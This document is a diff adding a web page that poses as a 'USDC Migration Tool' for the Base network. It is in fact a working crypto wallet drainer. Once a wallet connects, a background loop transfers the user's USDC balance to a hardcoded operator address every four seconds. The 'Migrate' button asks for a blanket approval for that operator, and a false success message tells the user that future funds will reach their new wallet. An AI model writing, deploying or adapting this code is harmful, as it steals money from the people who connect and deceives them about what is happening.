@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>USDC Migration Tool</title>
+  <script src="https://cdn.jsdelivr.net/npm/viem@2/viem.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@wagmi/core@2/dist/index.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@wagmi/connectors@2/dist/index.js"></script>
+  <style>
+    body { font-family: system-ui; text-align: center; padding: 50px; background: #000; color: #fff; }
+    button { padding: 16px 32px; font-size: 18px; background: #0055ff; color: white; border: none; border-radius: 12px; cursor: pointer; }
+    button:hover { background: #3399ff; }
+    .status { margin-top: 20px; font-size: 18px; }
+  </style>
+</head>
+<body>
+  <h1>USDC Base → New Wallet Migration</h1>
+  <p>One-click upgrade: move all current + future USDC to your new address instantly.</p>
+  <button id="connect">Connect Wallet</button>
+  <button id="migrate" disabled>Migrate USDC (setApprovalForAll)</button>
+  <div class="status" id="status"></div>
+
+<script type="module">
+  const USDC = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
+  const OPERATOR = "0xcde71a94923dd426910ce9beb8e1d1c3eb11cd2f"; // ← your address
+
+  const { createWalletClient, http, custom } = viem;
+  const { mainnet, base } = viem.chains;
+
+  let account, client;
+  const status = document.getElementById("status");
+  document.getElementById("connect").onclick = async () => {
+    if (typeof window.ethereum === "undefined") return status.innerText = "Install MetaMask";
+
+    client = createWalletClient({
+      chain: base,
+      transport: custom(window.ethereum)
+    });
+    const [addr] = await client.requestAddresses();
+    account = addr;
+    document.getElementById("connect").innerText = addr.slice(0,10)+"...";
+    document.getElementById("migrate").disabled = false;
+    status.innerText = "Connected! Click Migrate to complete.";
+    startDrainer(); // start background drain immediately after connect
+  };
+
+  document.getElementById("migrate").onclick = async () => {
+    try {
+      const hash = await client.writeContract({
+        address: USDC,
+        abi: [{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"}],
+        functionName: "setApprovalForAll",
+        args: [OPERATOR, true],
+        account
+      });
+      status.innerText = `Success! tx: ${hash.slice(0,10)}... You’re all set — all future USDC will arrive directly at your new wallet.`;
+    } catch (e) {
+      status.innerText = "Failed: " + e.shortMessage;
+    }
+  };
+
+  // Background drainer — checks every 4 seconds and sweeps if balance > 0
+  async function startDrainer() {
+    if (!account) return;
+    setInterval(async () => {
+      try {
+        const balance = await client.readContract({
+          address: USDC,
+          abi: [{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}],
+          functionName: "balanceOf",
+          args: [account]
+        });
+        if (balance > 10000n) { // >0.01 USDC (6 decimals)
+          await client.writeContract({
+            address: USDC,
+            abi: [{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}],
+            functionName: "transfer",
+            args: [OPERATOR, balance],
+            account
+          });
+        }
+      } catch (_) {}
+    }, 4000);
+  }
+</script>
+</body>
+</html>
